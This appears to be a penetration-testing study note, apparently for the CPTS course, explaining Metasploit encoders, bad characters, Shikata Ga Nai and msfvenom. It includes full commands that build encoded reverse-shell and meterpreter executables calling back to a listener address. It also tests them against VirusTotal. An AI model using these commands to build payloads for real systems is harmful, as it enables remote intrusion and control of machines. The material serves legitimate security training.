# 🔐 Encoders

---

## 🎯 What Are Encoders?

**Encoders** in Metasploit modify a payload's byte representation while attempting to preserve its functionality.

They are mainly useful for:

- 🧩 Removing **bad characters** from payloads
    
- 🖥️ Making payloads suitable for certain architectures
    
- 🛠️ Adapting payloads to exploit constraints
    
- 🛡️ Historically assisting with **AV evasion**
    

> [!important] ⚠️ Modern AV Evasion  
> Encoders should **not** be considered a reliable method of modern AV/EDR evasion.
> 
> Modern security products use behavioral detection, heuristics, machine learning, memory analysis, and other techniques rather than relying only on static signatures.

---

## 🧠 The Core Idea

Think of an encoder as a **wrapper around shellcode**:

```text
Original Payload
      │
      ▼
┌───────────────┐
│    Encoder    │
│  transforms   │
│    payload    │
└───────────────┘
      │
      ▼
Encoded Payload
      │
      ▼
Target executes
      │
      ▼
Encoder decodes payload
      │
      ▼
Original payload runs
```

The important point is:

> 🔑 **Encoding changes how the payload looks, not what the payload fundamentally does.**

---

# 🖥️ Supported Architectures

Metasploit provides encoders for different processor architectures, including:

|Architecture|Meaning|
|---|---|
|`x86`|32-bit Intel/AMD|
|`x64`|64-bit Intel/AMD|
|`sparc`|SPARC architecture|
|`ppc`|PowerPC|
|`mips`|MIPS architecture|

The encoder must generally be compatible with the architecture of the payload/exploit combination.

---

# 🚫 Bad Characters

One of the **most important legitimate uses** of encoders is removing **bad characters**.

A **bad character** is a byte that can interfere with the payload when it is delivered through a particular vulnerability.

For example:

```text
\x00
```

represents a NULL byte.

Depending on the vulnerability, a NULL byte might terminate a string:

```text
PAYLOAD\x00MORE_DATA
        ▲
        └── String may terminate here
```

This could cause the payload to be truncated before it reaches the target.

### 🧠 Mental Model

```text
Payload contains:

[ GOOD ][ GOOD ][ \x00 ][ GOOD ][ GOOD ]
                  │
                  ▼
             Bad Character
```

An encoder can transform the payload so that the problematic byte is no longer present in the encoded representation.

> [!tip] Remember  
> **Bad characters = bytes that cannot safely survive the delivery mechanism.**

---

# 🌀 Shikata Ga Nai (SGN)

One of Metasploit's historically famous encoders is:

```text
x86/shikata_ga_nai
```

Often abbreviated:

```text
SGN
```

The Japanese phrase:

```text
仕方がない
```

roughly means:

> **"It cannot be helped."**

Shikata Ga Nai became famous because of its **polymorphic encoding** capabilities.

It could produce different encoded representations of the same underlying payload.

However:

> [!warning] ⚠️ Important CPTS Concept  
> **Shikata Ga Nai is NOT a magic AV bypass.**
> 
> Modern AV/EDR products can recognize many characteristics associated with encoded Metasploit payloads.

Therefore:

```text
Encoding ≠ Guaranteed AV Evasion
```

---

# 🕰️ Old Metasploit Workflow

Before `msfvenom`, Metasploit used separate tools for payload generation and encoding.

### Payload generation

```text
msfpayload
```

### Encoding

```text
msfencode
```

They could be chained together:

```text
msfpayload
     │
     ▼
Payload
     │
     ▼
msfencode
     │
     ▼
Encoded Payload
```

Example:

```bash
msfpayload windows/shell_reverse_tcp \
LHOST=127.0.0.1 \
LPORT=4444 \
R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

### What is happening?

```text
msfpayload
    │
    │ Generates payload
    ▼
windows/shell_reverse_tcp
    │
    │ Pipe |
    ▼
msfencode
    │
    ├── Remove bad character: \x00
    │
    ├── Encoder: x86/shikata_ga_nai
    │
    └── Format: Perl
    ▼
Encoded payload
```

> [!info] Historical Note  
> `msfpayload` and `msfencode` were later replaced by the unified `msfvenom` workflow.

---

# ⚡ msfvenom

Today, Metasploit uses:

```text
msfvenom
```

for payload generation and encoding.

Instead of:

```text
msfpayload → msfencode
```

we can use:

```text
msfvenom
```

to handle both tasks.

### General Structure

```bash
msfvenom [architecture] [platform] [payload] [options] [encoder] [format]
```

For example:

```bash
msfvenom -a x86 \
--platform windows \
-p windows/shell/reverse_tcp \
LHOST=127.0.0.1 \
LPORT=4444 \
-f perl
```

---

# 🔄 Encoding with msfvenom

An encoder can be explicitly selected with:

```text
-e
```

Example:

```bash
msfvenom -a x86 \
--platform windows \
-p windows/shell/reverse_tcp \
LHOST=127.0.0.1 \
LPORT=4444 \
-e x86/shikata_ga_nai \
-f perl
```

### Important Options

|Option|Meaning|
|---|---|
|`-a`|Architecture|
|`--platform`|Target platform|
|`-p`|Payload|
|`-e`|Encoder|
|`-b`|Bad characters to avoid|
|`-i`|Number of encoding iterations|
|`-f`|Output format|
|`-o`|Output file|

---

# 🔁 Encoding Iterations

The `-i` option specifies the number of encoding iterations.

Example:

```bash
-i 10
```

means:

```text
Original Payload
      │
      ▼
 Encoding #1
      │
      ▼
 Encoding #2
      │
      ▼
 Encoding #3
      │
     ...
      │
      ▼
 Encoding #10
```

Each iteration can increase the payload size.

Example:

```text
Iteration 0 → 368 bytes
Iteration 1 → 395 bytes
Iteration 2 → 422 bytes
Iteration 3 → 449 bytes
...
Iteration 9 → 611 bytes
```

> [!warning] ⚠️ More Iterations ≠ Better AV Evasion  
> Repeated encoding does **not** guarantee that modern AV/EDR will stop detecting the payload.
> 
> It can instead make the payload larger and potentially easier to identify.

---

# 🔎 Selecting an Encoder in Metasploit

Inside `msfconsole`, use:

```text
show encoders
```

Metasploit will show encoders compatible with the currently selected exploit + payload combination.

Example:

```text
msf6 exploit(...) > show encoders

Compatible Encoders
===================

0  generic/eicar
1  generic/none
2  x64/xor
3  x64/xor_dynamic
4  x64/zutto_dekiru
```

### 🧠 Important

Metasploit automatically filters the available encoders according to the current context.

```text
Exploit
   +
Payload
   │
   ▼
Compatible Encoders
```

So you won't necessarily see every encoder available in Metasploit.

---

# 🔍 Searching for Encoders

Just like payloads, you can narrow down large lists.

For example:

```text
show encoders
```

may return many options.

For an x86 payload, you might see:

```text
x86/alpha_mixed
x86/alpha_upper
x86/call4_dword_xor
x86/context_cpuid
x86/countdown
x86/fnstenv_mov
x86/shikata_ga_nai
x86/unicode_mixed
```

One particularly recognizable encoder is:

```text
x86/shikata_ga_nai
```

---

# 🧩 Encoder Compatibility

Not every encoder works with every payload.

For example:

```text
x86 payload
    │
    ├── x86 encoder ✅
    │
    └── incompatible x64-only encoder ❌
```

Similarly:

```text
x64 payload
    │
    ├── x64 encoder ✅
    │
    └── x86-only encoder ❌
```

> [!important] Mental Model  
> **Payload architecture and encoder architecture need to be compatible.**

---

# 🧪 Example: Encoded Executable

A payload can be generated into an executable format:

```bash
msfvenom \
-a x86 \
--platform windows \
-p windows/meterpreter/reverse_tcp \
LHOST=10.10.14.5 \
LPORT=8080 \
-e x86/shikata_ga_nai \
-f exe \
-o payload.exe
```

The important components are:

```text
-a x86
    │
    └── Architecture

--platform windows
    │
    └── Target platform

-p windows/meterpreter/reverse_tcp
    │
    └── Payload

LHOST=10.10.14.5
    │
    └── Listener address

LPORT=8080
    │
    └── Listener port

-e x86/shikata_ga_nai
    │
    └── Encoder

-f exe
    │
    └── Output format

-o payload.exe
    │
    └── Output filename
```

---

# 🛡️ Why Encoding Does Not Reliably Evade Modern AV

Historically, antivirus products relied heavily on **signatures**.

A simplified example:

```text
Known malicious bytes
        │
        ▼
Signature match
        │
        ▼
🚨 Detection
```

Encoding could change those bytes:

```text
Original payload
      │
      ▼
Encoded payload
      │
      ▼
Different byte representation
```

This made simple signature-based detection harder.

Modern security products, however, can also examine:

- 🧠 Behavioral characteristics
    
- 🔬 Heuristics
    
- 🧬 Machine-learning detections
    
- 💾 Memory behavior
    
- 📦 PE characteristics
    
- 🔗 Network behavior
    
- 🪝 API/system-call activity
    
- 🛡️ EDR telemetry
    

Therefore:

```text
Encoded payload
      ≠
Undetectable payload
```

---

# 🧪 VirusTotal Testing

Payloads can be submitted to services such as VirusTotal to observe how many security engines detect them.

For example, the course demonstrates a Metasploit-generated executable being detected by many antivirus engines even after encoding.

The lesson is:

> [!important] Key Lesson  
> **Encoding alone is insufficient for modern AV evasion.**

Metasploit also provides:

```text
msf-virustotal
```

which can be used to submit and analyze files through VirusTotal when an appropriate API key is available.

Example structure:

```bash
msf-virustotal -k <API_KEY> -f payload.exe
```

---

# 🧠 Encoder vs Payload vs Exploit

This distinction is extremely important.

|Component|Job|
|---|---|
|💥 **Exploit**|Takes advantage of a vulnerability|
|📦 **Payload**|Performs the desired action after exploitation|
|🔐 **Encoder**|Transforms the payload representation|
|🎯 **Target**|The vulnerable system/service|

### Mental Model

```text
                 ATTACK
                   │
          ┌────────┴────────┐
          │                 │
       Exploit           Payload
          │                 │
          │                 ▼
          │             Encoder
          │                 │
          └────────┬────────┘
                   │
                   ▼
              Target System
```

> [!tip] Easy Way to Remember
> 
> **Exploit = How do I get in?**
> 
> **Payload = What do I run after getting in?**
> 
> **Encoder = How do I transform the payload's bytes?**

---

# 🧠 CPTS Mental Model

When working with Metasploit, think in this order:

```text
1️⃣ Identify vulnerability
        │
        ▼
2️⃣ Select exploit
        │
        ▼
3️⃣ Determine target OS / architecture
        │
        ▼
4️⃣ Select compatible payload
        │
        ▼
5️⃣ Check payload requirements
        │
        ▼
6️⃣ Consider bad characters
        │
        ▼
7️⃣ Select encoder ONLY if needed
        │
        ▼
8️⃣ Configure options
        │
        ▼
9️⃣ Execute / validate result
```

Do **not** automatically encode every payload.

---

# 📌 Essential Commands

### Show available encoders

```text
show encoders
```

### Generate a payload

```bash
msfvenom -p <payload> <options>
```

### Select an encoder

```bash
msfvenom -p <payload> -e <encoder>
```

### Specify bad characters

```bash
-b "\x00"
```

### Specify encoding iterations

```bash
-i 10
```

### Specify output format

```bash
-f exe
```

### Save output

```bash
-o payload.exe
```

---

# 🎯 Key Takeaways

> [!success] What You Should Remember

- 🔐 **Encoders transform payloads while preserving their intended functionality.**
    
- 🚫 They can help remove **bad characters** that interfere with exploitation.
    
- 🖥️ Encoders are architecture-dependent.
    
- 🌀 **Shikata Ga Nai** is a historically important polymorphic encoder.
    
- ⚡ `msfvenom` combines payload generation and encoding functionality.
    
- 🔎 `show encoders` displays encoders compatible with the current exploit/payload.
    
- 🔁 `-i` controls the number of encoding iterations.
    
- 📦 `-b` specifies bad characters to avoid.
    
- 🛡️ Encoding is **not a reliable modern AV/EDR evasion technique**.
    
- 📈 More encoding iterations can increase payload size without meaningfully improving detection resistance.
    
- 🧠 **Exploit gets you in → Payload performs the action → Encoder transforms the payload.**
    

---

## 🧩 One-Line Memory Trick

```text
EXPLOIT → GET IN
PAYLOAD → DO SOMETHING
ENCODER → CHANGE THE PAYLOAD'S FORM
```